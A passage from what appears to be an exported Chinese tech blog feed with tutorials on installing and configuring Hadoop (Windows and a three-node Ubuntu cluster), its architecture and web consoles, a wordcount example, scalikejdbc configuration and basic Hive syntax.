<p>PATH添加%HADOOP_HOME%&#x2F;bin</p>
<p>下载winutils相关，hadoop在windows上运行需要winutils支持和hadoop.dll等文件。</p>
<p><a href="https://github.com/steveloughran/winutils">https://github.com/steveloughran/winutils</a></p>
<p>下载对应版本的就可以，例如我用的是2.7.3，可以直接下载2.7.1的就好。然后把winutils.exe和hadoop.dll复制到hadoop的bin目录下。</p>
<h3 id="hadoop环境配置"><a href="#hadoop环境配置" class="headerlink" title="hadoop环境配置"></a>hadoop环境配置</h3><p>首先，进入hadoop文件夹下的etc\hadoop文件夹，文件夹下修改文件：</p>
<p>修改core-site.xml为如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">       &lt;name&gt;fs.defaultFS&lt;/name&gt;</span><br><span class="line">       &lt;value&gt;hdfs://localhost:9000&lt;/value&gt;</span><br><span class="line">   &lt;/property&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>

<p>修改mapred-site.xml为如下带啊名：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">   &lt;property&gt;</span><br><span class="line">       &lt;name&gt;mapreduce.framework.name&lt;/name&gt;</span><br><span class="line">       &lt;value&gt;yarn&lt;/value&gt;</span><br><span class="line">   &lt;/property&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>

<p>修改hdfs-site.xml如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">       &lt;name&gt;dfs.replication&lt;/name&gt;</span><br><span class="line">       &lt;value&gt;1&lt;/value&gt;</span><br><span class="line">   &lt;/property&gt;</span><br><span class="line">   &lt;property&gt;</span><br><span class="line">       &lt;name&gt;dfs.namenode.name.dir&lt;/name&gt;</span><br><span class="line">       &lt;value&gt;/D:/hadoop/data/namenode&lt;/value&gt;</span><br><span class="line">   &lt;/property&gt;</span><br><span class="line">   &lt;property&gt;</span><br><span class="line">       &lt;name&gt;dfs.datanode.data.dir&lt;/name&gt;</span><br><span class="line">     &lt;value&gt;/D:/hadoop/data/datanode&lt;/value&gt;</span><br><span class="line">   &lt;/property&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
<p>修改yarn-site.xml为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">   &lt;property&gt;</span><br><span class="line">       &lt;name&gt;yarn.nodemanager.aux-services&lt;/name&gt;</span><br><span class="line">       &lt;value&gt;mapreduce_shuffle&lt;/value&gt;</span><br><span class="line">   &lt;/property&gt;</span><br><span class="line">   &lt;property&gt;</span><br><span class="line">       &lt;name&gt;yarn.nodemanager.aux-services.mapreduce.shuffle.class&lt;/name&gt;</span><br><span class="line">       &lt;value&gt;org.apache.hadoop.mapred.ShuffleHandler&lt;/value&gt;</span><br><span class="line">   &lt;/property&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
<p>修改hadoop-env.cmd，JAVA_HOME设置为 set JAVA_HOME&#x3D;C:\Java\jdk1.8.0_144，并在尾部添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set HADOOP_IDENT_STRING=%USERNAME%</span><br><span class="line">set HADOOP_PREFIX=%HADOOP_HOME%</span><br><span class="line">set HADOOP_CONF_DIR=%HADOOP_PREFIX%\etc\hadoop</span><br><span class="line">set YARN_CONF_DIR=%HADOOP_CONF_DIR%</span><br><span class="line">set PATH=%PATH%;%HADOOP_PREFIX%\bin</span><br></pre></td></tr></table></figure>
<h3 id="运行hadoop"><a href="#运行hadoop" class="headerlink" title="运行hadoop"></a>运行hadoop</h3><p>打开cmd，执行‘hdfs namenode -format’,执行没有报错，说明成功</p>
<p>然后进入hadoop目录下sbin文件夹，双击start-all.cmd,得到四个cmd窗口</p>
<p>namenode,datanode,resourcemanager,nodemanager四个进程。则启动成功。</p>
<p>打开cmd输入jps可以看到： </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6548 NameNode</span><br><span class="line">6612 NodeManager</span><br><span class="line">6964 DataNode</span><br><span class="line">8516 Jps</span><br><span class="line">6232</span><br><span class="line">6680 ResourceManager</span><br></pre></td></tr></table></figure>
<h3 id="GUI"><a href="#GUI" class="headerlink" title="GUI"></a>GUI</h3><p>Resourcemanager GUI 地址 – <a href="http://localhost:8088/">http://localhost:8088</a></p>
<p>Namenode GUI 地址 – <a href="http://localhost:50070/">http://localhost:50070</a></p>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>hadoop组织架构</title>
    <url>/blog/bigdata/hadoop/hadoopjg/</url>
    <content><![CDATA[<h2 id="hadoop架构图"><a href="#hadoop架构图" class="headerlink" title="hadoop架构图"></a>hadoop架构图</h2><p><img src="/images/hadoop/hadoopjg.png" alt="hadoop架构图"></p>
<h2 id="hadoop的主从模式"><a href="#hadoop的主从模式" class="headerlink" title="hadoop的主从模式"></a>hadoop的主从模式</h2><p>对于Hadoop的集群来讲，可以分成两大类角色：Master和Salve。</p>
<p>一个HDFS集群是由一个NameNode和若干个DataNode组成的。其中NameNode作为主服务器，管理文件系统的命名空间和客户端对文件系统的访问操作；集群中的DataNode管理存储的数据。</p>
<p>MapReduce框架是由一个单独运行在主节点上的JobTracker和运行在每个从节点的TaskTracker共同组成的。主节点负责调度构成一个作业的所有任务，这些任务分布在不同的从节点上。主节点监控它们的执行情况，并且重新执行之前的失败任务；从节点仅负责由主节点指派的任务。当一个Job被提交时，JobTracker接收到提交作业和配置信息之后，就会将配置信息等分发给从节点，同时调度任务并监控TaskTracker的执行。</p>
<p>HDFS和MapReduce共同组成了Hadoop分布式系统体系结构的核心。HDFS在集群上实现分布式文件系统，MapReduce在集群上实现了分布式计算和任务处理。HDFS在MapReduce任务处理过程中提供了文件操作和存储等支持，MapReduce在HDFS的基础上实现了任务的分发、跟踪、执行等工作，并收集结果，二者相互作用，完成了Hadoop分布式集群的主要任务。</p>
<p>运行的主要功能：</p>
<p>Master：Namenode、Secondary<br>Namenode、Jobtracker。管理服务（用浏览器观看管理界面），其它Hadoop工具。</p>
<p>Slave：Tasktracker、Datanode</p>
<h2 id="Namenode"><a href="#Namenode" class="headerlink" title="Namenode"></a>Namenode</h2><ul>
<li>HDFS的守护程序</li>
<li>纪录文件是如何分割成数据块的，以及这些数据块被存储到哪些节点上</li>
<li>对内存和I&#x2F;O进行集中管理</li>
<li>是个单点，发生故障将使集群崩溃</li>
</ul>
<h2 id="Secondary-Namenode"><a href="#Secondary-Namenode" class="headerlink" title="Secondary Namenode"></a>Secondary Namenode</h2><ul>
<li>监控HDFS状态的辅助后台程序</li>
<li>每个集群都有一个</li>
<li>与NameNode进行通讯，定期保存HDFS元数据快照</li>
<li>当NameNode故障可以作为备用NameNode使用</li>
</ul>
<h2 id="DataNode"><a href="#DataNode" class="headerlink" title="DataNode"></a>DataNode</h2><ul>
<li>每台从服务器都运行一个</li>
<li>负责把HDFS数据块读写到本地文件系统</li>
</ul>
<h2 id="JobTracker"><a href="#JobTracker" class="headerlink" title="JobTracker"></a>JobTracker</h2><ul>
<li>用于处理作业（用户提交代码）的后台程序</li>
<li>决定有哪些文件参与处理，然后切割task并分配节点</li>
<li>监控task，重启失败的task（于不同的节点）</li>
<li>每个集群只有唯一一个JobTracker，位于Master节点</li>
</ul>
<h2 id="TaskTracker"><a href="#TaskTracker" class="headerlink" title="TaskTracker"></a>TaskTracker</h2><ul>
<li>位于slave节点上，与datanode结合（代码与数据一起的原则）</li>
<li>管理各自节点上的task（由jobtracker分配）</li>
<li>每个节点只有一个tasktracker，但一个tasktracker可以启动多个JVM，用于并行执行map或reduce任务</li>
<li>与jobtracker交互</li>
</ul>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>Hadoop WEB控制台的使用</title>
    <url>/blog/bigdata/hadoop/hadoopwebmanager/</url>
    <content><![CDATA[<p>hadoop提供了WEB服务可供使用者查看系统状态，主要有两个控制台：</p>
<p>任务控制台：<a href="http://hadoop-1:50030/jobtracker.jsp">http://hadoop-1:50030/jobtracker.jsp</a></p>
<p>文件控制台：<a href="http://hadoop-1:50070/dfshealth.jsp">http://hadoop-1:50070/dfshealth.jsp</a></p>
<h2 id="任务控制台"><a href="#任务控制台" class="headerlink" title="任务控制台"></a>任务控制台</h2><p>可以查看集群信息、计划中任务、运行中任务、已完成任务。</p>
<p>任务控制台首页：</p>
<p><img src="/images/hadoop/jobtrackerjsp.png"></p>
<p>tasktracker节点：</p>
<p><img src="/images/hadoop/machinesjsp.png"></p>
<p>已完成任务详情：</p>
<p><img src="/images/hadoop/jobdetailsjsp.png"></p>
<h2 id="文件控制台"><a href="#文件控制台" class="headerlink" title="文件控制台"></a>文件控制台</h2><p>可以查看活动节点和死亡节点，还有一个WEB版文件浏览器可以看HDFS的目录和文件。</p>
<p>HDFS控制台首页：</p>
<p><img src="/images/hadoop/dfshealthjsp.png"></p>
<p>活动datanode列表：</p>
<p><img src="/images/hadoop/dfsnodelistjsp.png"></p>
<p>浏览HDFS文件系统：</p>
<p><img src="/images/hadoop/browsedirjsp.png"></p>
<p>查看HDFS文件：</p>
<p><img src="/images/hadoop/browseblockjsp.png"></p>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>Hadoop的hello world程序</title>
    <url>/blog/bigdata/hadoop/helloworld/</url>
    <content><![CDATA[<p>这里利用hadoop自带的hadoop-0.20.2-examples.jar做一个单词统计的测试，相当于编程时的Hello<br>World程序。</p>
<p>注意切换目录，”hadoop@hadoop-1:~&#x2F;hadoop-0.20.2$“的格式为”用户@主机:目录$“，注意命令运行时的目录所在，可以通过CD命令切换目录。</p>
<pre><code>hadoop@hadoop-1:~/hadoop-0.20.2$ ls
bin          docs                        ivy          NOTICE.txt
build.xml    hadoop-0.20.2-ant.jar       ivy.xml      README.txt
c++          hadoop-0.20.2-core.jar      lib          src
CHANGES.txt  hadoop-0.20.2-examples.jar  librecordio  webapps
conf         hadoop-0.20.2-test.jar      LICENSE.txt
contrib      hadoop-0.20.2-tools.jar     logs
hadoop@hadoop-1:~/hadoop-0.20.2$ 
</code></pre>
<p>创建input文件夹，在里面创建两个文件，里面输入英文单词。</p>
<pre><code>hadoop@hadoop-1:~$ mkdir input
hadoop@hadoop-1:~$ ls
1  hadoop-0.20.2         input   模板  图片  下载  桌面
3  hadoop-0.20.2.tar.gz  公共的  视频  文档  音乐
hadoop@hadoop-1:~$ cd input
hadoop@hadoop-1:~/input$ echo &quot;hello world&quot;&gt;test1.txt
hadoop@hadoop-1:~/input$ echo &quot;hello hadoop&quot;&gt;test2.txt
hadoop@hadoop-1:~/input$ cat test1.txt 
hello world
hadoop@hadoop-1:~/input$ cat test2.txt 
hello hadoop
hadoop@hadoop-1:~/input$ 
</code></pre>
<p>将input目录复制到HDFS文件系统的in目录。</p>
<pre><code>hadoop@hadoop-1:~/input$ cd ../hadoop-0.20.2/
hadoop@hadoop-1:~/hadoop-0.20.2$ bin/hadoop dfs -put ../input in
hadoop@hadoop-1:~/hadoop-0.20.2$ bin/hadoop dfs -ls ./in/*
-rw-r--r--   2 hadoop supergroup         12 2015-10-18 00:59 /user/hadoop/in/test1.txt
-rw-r--r--   2 hadoop supergroup         13 2015-10-18 00:59 /user/hadoop/in/test2.txt
hadoop@hadoop-1:~/hadoop-0.20.2$ 
</code></pre>
<p>执行统计单词的任务，统计in目录里的文件，结果放到out目录里。</p>
<pre><code>hadoop@hadoop-1:~/hadoop-0.20.2$ bin/hadoop jar hadoop-0.20.2-examples.jar wordcount in out 
15/10/18 01:03:40 INFO input.FileInputFormat: Total input paths to process : 2
15/10/18 01:03:41 INFO mapred.JobClient: Running job: job_201510171812_0001
15/10/18 01:03:42 INFO mapred.JobClient:  map 0% reduce 0%
15/10/18 01:03:52 INFO mapred.JobClient:  map 50% reduce 0%
15/10/18 01:03:56 INFO mapred.JobClient:  map 100% reduce 0%
15/10/18 01:04:07 INFO mapred.JobClient:  map 100% reduce 100%
15/10/18 01:04:09 INFO mapred.JobClient: Job complete: job_201510171812_0001
15/10/18 01:04:09 INFO mapred.JobClient: Counters: 17
15/10/18 01:04:09 INFO mapred.JobClient:   Map-Reduce Framework
15/10/18 01:04:09 INFO mapred.JobClient:     Combine output records=4
15/10/18 01:04:09 INFO mapred.JobClient:     Spilled Records=8
15/10/18 01:04:09 INFO mapred.JobClient:     Reduce input records=4
15/10/18 01:04:09 INFO mapred.JobClient:     Reduce output records=3
15/10/18 01:04:09 INFO mapred.JobClient:     Map input records=2
15/10/18 01:04:09 INFO mapred.JobClient:     Map output records=4
15/10/18 01:04:09 INFO mapred.JobClient:     Map output bytes=41
15/10/18 01:04:09 INFO mapred.JobClient:     Reduce shuffle bytes=61
15/10/18 01:04:09 INFO mapred.JobClient:     Combine input records=4
15/10/18 01:04:09 INFO mapred.JobClient:     Reduce input groups=3
15/10/18 01:04:09 INFO mapred.JobClient:   FileSystemCounters
15/10/18 01:04:09 INFO mapred.JobClient:     HDFS_BYTES_READ=25
15/10/18 01:04:09 INFO mapred.JobClient:     FILE_BYTES_WRITTEN=180
15/10/18 01:04:09 INFO mapred.JobClient:     FILE_BYTES_READ=55
15/10/18 01:04:09 INFO mapred.JobClient:     HDFS_BYTES_WRITTEN=25
15/10/18 01:04:09 INFO mapred.JobClient:   Job Counters 
15/10/18 01:04:09 INFO mapred.JobClient:     Launched map tasks=2
15/10/18 01:04:09 INFO mapred.JobClient:     Launched reduce tasks=1
15/10/18 01:04:09 INFO mapred.JobClient:     Data-local map tasks=2
hadoop@hadoop-1:~/hadoop-0.20.2$ 
</code></pre>
<p>查看HDFS文件系统，可以看到多出了个out目录。</p>
<pre><code>hadoop@hadoop-1:~/hadoop-0.20.2$ bin/hadoop dfs -ls
Found 2 items
drwxr-xr-x   - hadoop supergroup          0 2015-10-18 00:59 /user/hadoop/in
drwxr-xr-x   - hadoop supergroup          0 2015-10-18 01:04 /user/hadoop/out
hadoop@hadoop-1:~/hadoop-0.20.2$ 
</code></pre>
<p>查看out目录，时面有个_logs目录，还有一个part-r-00000文件。</p>
<pre><code>hadoop@hadoop-1:~/hadoop-0.20.2$ bin/hadoop dfs -ls ./out
Found 2 items
drwxr-xr-x   - hadoop supergroup          0 2015-10-18 01:03 /user/hadoop/out/_logs
-rw-r--r--   2 hadoop supergroup         25 2015-10-18 01:04 /user/hadoop/out/part-r-00000
</code></pre>
<p>查看结果，可以看到统计结果。</p>
<pre><code>hadoop@hadoop-1:~/hadoop-0.20.2$ bin/hadoop dfs -cat ./out/part-r-00000
hadoop  1
hello   2
world   1
</code></pre>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>Hadoop学习笔记</title>
    <url>/blog/bigdata/hadoop/index/</url>
    <content><![CDATA[<h2 id="hadoop的起源"><a href="#hadoop的起源" class="headerlink" title="hadoop的起源"></a>hadoop的起源</h2><p>Lucene，Doug Cutting开创的开源软件，用java书写代码，实现与Google类似的全文搜索功能，它提供了全文检索引擎的架构，包括完整的查询引擎和索引引擎</p>
<p>2001年年底Lucene成为apache软件基金会jakarta的一个子项目。</p>
<p>对于大数量的场景，Lucene面对与Google同样的困难。迫使Doug Cutting学习和模仿Google解决这些问题的办法。</p>
<p>2003-2004年，Google公开了部分GFS和Mapreduce思想的细节，以此为基础Doug Cutting等人用了2年业余时间实现了DFS和Mapreduce机制。</p>
<p>Hadoop于2005年秋天作为Lucene的子项目Nutch（一个微缩版的Lucene）的一部分正式引入Apache基金会。</p>
<p>2006年3月份，Map-Reduce 和 Nutch Distributed File System (NDFS)分别被纳入称为 Hadoop 的项目中。</p>
<p>hadoop山寨的google的三项主要技术：</p>
<ul>
<li>GFS：对应HDFS</li>
<li>Mapreduce：名称都没变，也叫Mapreduce</li>
<li>bigtable：对应Hbase</li>
</ul>
<h2 id="hadoop的家族"><a href="#hadoop的家族" class="headerlink" title="hadoop的家族"></a>hadoop的家族</h2><p><img src="/images/hadoop/hadoopjz.png" alt="hadoop的家族"></p>
<p>Hive是一个建立在Hadoop基础之上的数据仓库，它提供了一些用于对Hadoop文件中的数据集进行数据整理、特殊查询和分析存储的工具。Hive提供的是一种结构化数据的机制，它支持类似于传统RDBMS中的SQL语言的查询语言，来帮助哪些熟悉SQL的用户查询Hadoop中的数据，该查询语言成为Hive<br>QL。与此同时，传统的MapReduce编程人员也可以在Mapper或Reducer中通过Hive QL查询数据。Hive编译器会把Hive QL编译成一组MapReduce任务，从而方便MapReduce编程人员进行Hadoop系统开发。</p>
<p>HBase是一个分布式的、面向列的开源数据库，该技术来源于Google论文《Bigtable：一个结构化数据的分布式存储系统》。如同Bigtable利用了Google文件系统（Google File<br>System）提供的分布式数据存储方式一样，HBase在Hadoop之上提供了类似于Bigtable的能力。HBase不同于一般的关系数据库，原因有两个：其一，HBase是一个适合于非结构化数据存储的数据库；其二，HBase是基于列而不是基于行的模式。HBase和Bigtable使用相同<br>的数据模型。用户将数据存储在一个表里，一个数据行拥有一个可选择的键和任意数量的列。由于HBase表是疏松的，用户可以为行定义各种不同的列。</p>
<p>HBase主要用于需要随机访问、实时读写的大数据（Big Data）。</p>
<p>Pig是一个对大型数据集进行分析、评估的平台。Pig最突出的优势是它的结构能够经受住高度并行化的检验，这个特性使得它能够处理大型的数据集。目前，Pig的底层是一个编译器组成，它在运行的时候会产生一些MapReduce程序序列，Pig的语言层由一种叫做Pig<br>Latin的正文型语言组成。</p>
<p>ZooKeeper是一个为分布式应用所研究的开源协调服务。它主要为用户提供同步、配置管理、分组和命名等服务，减轻分布式应用程序所承担的协调任务。ZooKeeper的文件系统使用了我们所熟悉的目录树结构。ZooKeeper是使用Java编写的，但是它支持Java和C两种编程语言。</p>
<p>Sqoop:<br>是一个用来将Hadoop和关系型数据库中的数据相互转移的工具，可以将一个关系型数据库（MySQL ,Oracle<br>,Postgres等）中的数据导进到Hadoop的HDFS中，也可以将HDFS的数据导进到关系型数据库中。</p>
<p>Mahout:是基于Hadoop的机器学习和数据挖掘的一个分布式框架。Mahout用MapReduce实现了部分数据挖掘算法，解决了并行挖掘的问题。</p>
<p>Flume:<br>是一个分布的、可靠的、高可用的海量日志聚合的系统，可用于日志数据收集，日志数据处理，日志数据传输</p>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>Hadoop的配制与安装</title>
    <url>/blog/bigdata/hadoop/install/</url>
    <content><![CDATA[<h2 id="安装环境准备"><a href="#安装环境准备" class="headerlink" title="安装环境准备"></a>安装环境准备</h2><p>真正实现分布式的安装至少到3个Linux环境，这可以通过虚拟机在一台电脑上安装三个linux模拟。虚拟机可以用virtualbox、vmware等。</p>
<p>hadoop是基于JAVA的，所以linux中要安装好JDK环境。可以参考<a href="/os/linux/install/jdktar.php">linux下如何用tar.gz包安装JDK</a></p>
<p>三个linux环境要安装好ssh服务，可以实现免密码登录。可以参考<a href="/os/linux/ubuntu/sshmmmjr.php">Ubuntu Linux配制SSH免密码接入</a></p>
<p>配制好ip和hostname，可以参考<a href="/os/linux/ubuntu/hostname.php">ubuntu如何查看修改主机名</a></p>
<p>下面是我配制的linux的一些参数：</p>
<p>系统:Ubuntu 14</p>
<p>主机名：hadoop-1，hadoop-2,hadoop-2</p>
<p>用户名统一为hadoop。</p>
<h2 id="下载hadoop安装包"><a href="#下载hadoop安装包" class="headerlink" title="下载hadoop安装包"></a>下载hadoop安装包</h2><p>这里学习所用的hadoop版本为hadoop-0.20.2.tar.gz,可以从下面提供的链接下载。</p>
<p>hadoop-0.20.2.tar.gz</p>
<p><a href="http://pan.baidu.com/s/1sj661Il">http://pan.baidu.com/s/1sj661Il</a></p>
<p>eukf</p>
<p>把安装包放在主文件夹下，也就是&#x2F;home&#x2F;hadoop&#x2F;下。</p>
<h2 id="修改配制文件"><a href="#修改配制文件" class="headerlink" title="修改配制文件"></a>修改配制文件</h2><p>解压安装包：</p>
<pre><code>hadoop@hadoop-1:~$ tar -zxvf hadoop-0.20.2.tar.gz
</code></pre>
<p>修改配制文件，位置位于&#x2F;home&#x2F;hadoop&#x2F;hadoop-0.20.2&#x2F;conf&#x2F;</p>
<h3 id="hadoop-env-sh"><a href="#hadoop-env-sh" class="headerlink" title="hadoop-env.sh"></a>hadoop-env.sh</h3><p>设置JAVA_HOME值，去掉前面的#号，把值设置成安装的JDK的位置。</p>
<pre><code># The java implementation to use.  Required.
export JAVA_HOME=/opt/java/jdk1.8.0_45/
</code></pre>
<h3 id="core-site-xml"><a href="#core-site-xml" class="headerlink" title="core-site.xml"></a>core-site.xml</h3><pre><code>&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;





fs.default.name
hdfs://hadoop-1:9000
</code></pre>
<p>添加NameNode的地址。</p>
<h3 id="mapred-site-xml"><a href="#mapred-site-xml" class="headerlink" title="mapred-site.xml"></a>mapred-site.xml</h3><pre><code>&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;





mapred.job.tracker
hadoop-1:9001
</code></pre>
<p>设置jobtracker的地址。</p>
<h3 id="hdfs-site-xml"><a href="#hdfs-site-xml" class="headerlink" title="hdfs-site.xml"></a>hdfs-site.xml</h3><pre><code>&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;





dfs.replication
2
</code></pre>
<p>设置HDFS的冗余数量，因为只有两个slave，所以最大就是2了。</p>
<h3 id="master文件"><a href="#master文件" class="headerlink" title="master文件"></a>master文件</h3><pre><code>hadoop-1
</code></pre>
<h3 id="slaves文件"><a href="#slaves文件" class="headerlink" title="slaves文件"></a>slaves文件</h3><pre><code>hadoop-2
hadoop-3
</code></pre>
<h2 id="向各节点复制"><a href="#向各节点复制" class="headerlink" title="向各节点复制"></a>向各节点复制</h2><pre><code>hadoop@hadoop-1:~$ scp -r ./hadoop-0.20.2 hadoop-2:/home/hadoop/
hadoop@hadoop-1:~$ scp -r ./hadoop-0.20.2 hadoop-3:/home/hadoop/
</code></pre>
<p>好了，到这里就配制好了一个master，两个slave的分布式hadoop了。</p>
<h2 id="启动hadoop"><a href="#启动hadoop" class="headerlink" title="启动hadoop"></a>启动hadoop</h2><p>用cd命令切换到hadoop-0.20.2目录。</p>
<p>格式化分布式文件系统</p>
<pre><code>hadoop@hadoop-1:~/hadoop-0.20.2$ bin/hadoop namenode -format
</code></pre>
<p>启动hadoop</p>
<pre><code>hadoop@hadoop-1:~/hadoop-0.20.2$ bin/start-all.sh
</code></pre>
<h2 id="查看运行情况"><a href="#查看运行情况" class="headerlink" title="查看运行情况"></a>查看运行情况</h2><p>用JAVA的JPS命令查看进程情况，可以看出master上运行了namenode和jobtracker。</p>
<pre><code>hadoop@hadoop-1:~/hadoop-0.20.2$ jps
5379 NameNode
5571 SecondaryNameNode
5622 JobTracker
14204 Jps
hadoop@hadoop-1:~/hadoop-0.20.2$ 
</code></pre>
<p>slave上的进程情况，可以看到datanode和tasktracker在运行。</p>
<pre><code>hadoop@hadoop-2:~$ jps
22560 Jps
5364 TaskTracker
5294 DataNode
hadoop@hadoop-2:~$ 
</code></pre>
<p>到这里hadoop就完成了安装，并成功启动了。</p>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>scalikejdbc数据连接配制</title>
    <url>/blog/bigdata/spark/scalikejdbcconfig/</url>
    <content><![CDATA[<p>原文档地址：<a href="http://scalikejdbc.org/documentation/configuration.html">http://scalikejdbc.org/documentation/configuration.html</a></p>
<h2 id="安装配制"><a href="#安装配制" class="headerlink" title="安装配制"></a>安装配制</h2><p><code>scalikejdbc-config</code>是基于<code>typesafe config</code>的简化配制方式。</p>
<p><code>typesafe config</code>地址：<a href="https://github.com/typesafehub/config">https://github.com/typesafehub/config</a></p>
<p>配制文件应该像这样：</p>
<p><code>src/main/resources/application.conf</code></p>
<p>可以看Typesafe Config的详细文档说明。</p>
<p>文件内容应该像这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># JDBC settings</span><br><span class="line">db.default.driver=&quot;org.h2.Driver&quot;</span><br><span class="line">db.default.url=&quot;jdbc:h2:file:./db/default&quot;</span><br><span class="line">db.default.user=&quot;sa&quot;</span><br><span class="line">db.default.password=&quot;&quot;</span><br><span class="line"># Connection Pool settings</span><br><span class="line">db.default.poolInitialSize=10</span><br><span class="line">db.default.poolMaxSize=20</span><br><span class="line">db.default.connectionTimeoutMillis=1000</span><br><span class="line"></span><br><span class="line"># Connection Pool settings</span><br><span class="line">db.default.poolInitialSize=5</span><br><span class="line">db.default.poolMaxSize=7</span><br><span class="line">db.default.poolConnectionTimeoutMillis=1000</span><br><span class="line">db.default.poolValidationQuery=&quot;select 1 as one&quot;</span><br><span class="line">db.default.poolFactoryName=&quot;commons-dbcp&quot;</span><br><span class="line"></span><br><span class="line">db.legacy.driver=&quot;org.h2.Driver&quot;</span><br><span class="line">db.legacy.url=&quot;jdbc:h2:file:./db/db2&quot;</span><br><span class="line">db.legacy.user=&quot;foo&quot;</span><br><span class="line">db.legacy.password=&quot;bar&quot;</span><br><span class="line"></span><br><span class="line"># MySQL example</span><br><span class="line">db.default.driver=&quot;com.mysql.jdbc.Driver&quot;</span><br><span class="line">db.default.url=&quot;jdbc:mysql://localhost/scalikejdbc&quot;</span><br><span class="line"></span><br><span class="line"># PostgreSQL example</span><br><span class="line">db.default.driver=&quot;org.postgresql.Driver&quot;</span><br><span class="line">db.default.url=&quot;jdbc:postgresql://localhost:5432/scalikejdbc&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import scalikejdbc._</span><br><span class="line">import scalikejdbc.config._</span><br><span class="line"></span><br><span class="line">// DBs.setup/DBs.setupAll loads specified JDBC driver classes.</span><br><span class="line">DBs.setupAll()</span><br><span class="line">// DBs.setup()</span><br><span class="line">// DBs.setup(&#x27;legacy)</span><br><span class="line">// // Unlike DBs.setupAll(), DBs.setup() doesn&#x27;t load configurations under global settings automatically</span><br><span class="line">// DBs.loadGlobalSettings()</span><br><span class="line"></span><br><span class="line">// loaded from &quot;db.default.*&quot;</span><br><span class="line">val memberIds = DB readOnly &#123; implicit session =&gt;</span><br><span class="line">  sql&quot;select id from members&quot;.map(_.long(1)).list.apply()</span><br><span class="line">&#125;</span><br><span class="line">// loaded from &quot;db.legacy.*&quot;</span><br><span class="line">val legacyMemberIds = NamedDB(&#x27;legacy) readOnly &#123; implicit session =&gt;</span><br><span class="line">  sql&quot;select id from members&quot;.map(_.long(1)).list.apply()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// wipes out ConnectionPool</span><br><span class="line">DBs.closeAll()</span><br></pre></td></tr></table></figure>
<h2 id="全局设置"><a href="#全局设置" class="headerlink" title="全局设置"></a>全局设置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Global settings</span><br><span class="line">scalikejdbc.global.loggingSQLAndTime.enabled=true</span><br><span class="line">scalikejdbc.global.loggingSQLAndTime.logLevel=info</span><br><span class="line">scalikejdbc.global.loggingSQLAndTime.warningEnabled=true</span><br><span class="line">scalikejdbc.global.loggingSQLAndTime.warningThresholdMillis=1000</span><br><span class="line">scalikejdbc.global.loggingSQLAndTime.warningLogLevel=warn</span><br><span class="line">scalikejdbc.global.loggingSQLAndTime.singleLineMode=false</span><br><span class="line">scalikejdbc.global.loggingSQLAndTime.printUnprocessedStackTrace=false</span><br><span class="line">scalikejdbc.global.loggingSQLAndTime.stackTraceDepth=10</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>HIVE常用语法</title>
    <url>/blog/bigdata/hive/hiveuse/</url>
    <content><![CDATA[<h4 id="CREATE-DATABASE语句"><a href="#CREATE-DATABASE语句" class="headerlink" title="CREATE DATABASE语句"></a>CREATE DATABASE语句</h4><p><code>CREATE DATABASE|SCHEMA [IF NOT EXISTS] &lt;database name&gt;</code></p>
<h4 id="查询数据库列表"><a href="#查询数据库列表" class="headerlink" title="查询数据库列表"></a>查询数据库列表</h4><p><code>SHOW DATABASES;</code></p>
<h4 id="DROP-DATABASE语句"><a href="#DROP-DATABASE语句" class="headerlink" title="DROP DATABASE语句"></a>DROP DATABASE语句</h4><p><code>DROP DATABASE StatementDROP (DATABASE|SCHEMA) [IF EXISTS] database_name [RESTRICT|CASCADE];</code></p>
